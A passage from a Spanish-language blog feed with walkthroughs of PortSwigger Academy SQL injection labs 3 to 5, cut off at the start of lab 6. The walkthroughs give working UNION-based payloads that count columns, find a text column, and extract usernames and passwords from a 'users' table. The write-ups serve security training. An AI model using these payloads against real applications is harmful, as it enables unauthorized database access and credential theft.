&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Ingresamos a la web y elegimos alguna categoria, en este ejemplo sera la categoria Pets.Ahora es momento de ir probando secuencialmente numero en numero y ver hasta que valor nos dara el error:&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Payload&lt;/th&gt;
&lt;th&gt;Resultado&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; order by 1&amp;ndash;&lt;/td&gt;
&lt;td&gt;Imprime resultados normalmente&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; order by 2&amp;ndash;&lt;/td&gt;
&lt;td&gt;Imprime resultados normalmente&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; order by 3&amp;ndash;&lt;/td&gt;
&lt;td&gt;Imprime resultados normalmente&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; order by 4&amp;ndash;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT NULL&amp;ndash;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT NULL,NULL&amp;ndash;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT NULL,NULL,NULL&amp;ndash;&lt;/td&gt;
&lt;td&gt;Imprimer resultados normalmente&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT NULL,NULL,NULL,NULL&amp;ndash;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Como se ve al ingresar el valor 4 o 1,2 y 4 nulls, nos muestra un error de &lt;code&gt;Internal server error&lt;/code&gt; lo que hace que el backend no este respondiendo de manera correcta y no pueda procesar la solicitud. Con esto sabemos que la tabla en la que se extrae los datos cuenta con 3 columnas.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 147; 
			flex-basis: 354px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/resuelto.png&#34; data-size=&#34;1791x1214&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/resuelto.png&#34;
			width=&#34;1791&#34;
			height=&#34;1214&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/resuelto_hudec4bf4e3164bf85cecd215025d78dae_169992_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/resuelto_hudec4bf4e3164bf85cecd215025d78dae_169992_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 4</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/</link>
        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 4" /&gt;&lt;h1 id=&#34;lab-sql-injection-union-attack-finding-a-column-containing-text&#34;&gt;Lab: SQL injection UNION attack, finding a column containing text&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es saber el tipo de datos que es utilizado en los valores que son enviadas en la consulta, ya que es necesario saber que tipo de valor son para que el sistema no genere errores al momento de extraeros, utilizaremos la informacion anterior primero enumerando el numero de columnas, y al hacer el reconocimiento sabemos que cuenta con 3 columnas ya que es la unica que no genera un error.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; UNION SELECT NULL,NULL,NULL--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Ingresamos a la web y al acceder en mi caso me pide que imprima el valor &lt;code&gt;mO7mSy&lt;/code&gt; al recuperar los datos, asi que buscaremos que valores aceptan string para poder imprimirlo&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Payload&lt;/th&gt;
&lt;th&gt;Resultado&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT &amp;lsquo;test&amp;rsquo;,NULL,NULL&amp;ndash;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT NULL,&amp;lsquo;test&amp;rsquo;,NULL&amp;ndash;&lt;/td&gt;
&lt;td&gt;Imprime resultados normalmente&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT NULL,NULL,&amp;lsquo;test&amp;rsquo;&amp;ndash;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Nos podemos dar cuenta que la columna dos permite que se puedan ingresar datos de tipo string ahora toca ingresar la cadena que nos indican para poder resolver el lab, inyectando la consulta sql:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; UNION SELECT NULL,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mO7mSy&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,NULL--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 142; 
			flex-basis: 340px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/resuelto.png&#34; data-size=&#34;1758x1238&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/resuelto.png&#34;
			width=&#34;1758&#34;
			height=&#34;1238&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/resuelto_huec4219d55952b16f59692c854c1e5e19_171125_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/resuelto_huec4219d55952b16f59692c854c1e5e19_171125_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 5</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/</link>
        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 5" /&gt;&lt;h1 id=&#34;lab-lab-sql-injection-union-attack-retrieving-data-from-other-tables&#34;&gt;Lab: Lab: SQL injection UNION attack, retrieving data from other tables&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer los datos de una tabla, las columnas son &lt;code&gt;username&lt;/code&gt; y &lt;code&gt;password&lt;/code&gt; de la tabla &lt;code&gt;users&lt;/code&gt;. La idea es hacer uso del metodo union en sql para poder extraer esos datos aparte de los que ya trae el sistema. La consulta comun para recuperar estos datos seria:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Ahora toca usar el metodo union para poder recuperar esos datos y tratar de inyectar ese comando en la consulta primaria para recuperar los usuarios y contrasenas de la tala de usuarios.&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;h4 id=&#34;recuperar-columnas&#34;&gt;Recuperar columnas&lt;/h4&gt;
&lt;p&gt;Recuperamos las columnas inyectando la siguiente consulta:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets&#39; order by 4--
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;recuperar-tipo-de-datos&#34;&gt;Recuperar tipo de datos&lt;/h4&gt;
&lt;p&gt;Ahora queremos saber que tipos de datos acceptan, inyectando algunas string en los dos vemos que no hay problema al hacerlo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 100; 
			flex-basis: 241px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/strings.png&#34; data-size=&#34;1781x1773&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/strings.png&#34;
			width=&#34;1781&#34;
			height=&#34;1773&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/strings_hub14488023fc5142b8e0617dac40dcbeb_519418_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/strings_hub14488023fc5142b8e0617dac40dcbeb_519418_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Tipo de Datos aceptados&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Tipo de Datos aceptados&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;recuperar-datos-de-usuarios&#34;&gt;Recuperar datos de usuarios&lt;/h4&gt;
&lt;p&gt;Ahra ya podemos tomar los datos de la tabla de usuarios que se nos pide, para eso inyectaremos la siguiente consulta:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select username,password from users--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 100; 
			flex-basis: 240px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido.png&#34; data-size=&#34;1744x1742&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido.png&#34;
			width=&#34;1744&#34;
			height=&#34;1742&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido_hu27c916cebc82f9da26fc034f1f8e70b9_529545_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido_hu27c916cebc82f9da26fc034f1f8e70b9_529545_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Usuarios y Contrasenas de la tabla users&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Usuarios y Contrasenas de la tabla users&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora que ya nos hicimos con los datos del administrador, podemos iniciar sesion para que el sistema ya nos tome como resuelto el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 207; 
			flex-basis: 497px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto.png&#34; data-size=&#34;1786x862&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto.png&#34;
			width=&#34;1786&#34;
			height=&#34;862&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto_hu8619a3f0e8c32341800ab4c4e3a758b5_98522_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto_hu8619a3f0e8c32341800ab4c4e3a758b5_98522_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 6</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/</link>
        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 6" /&gt;&lt;h1 id=&#34;lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column&#34;&gt;Lab: SQL injection UNION attack, retrieving multiple values in a single column&lt;/h1&gt;
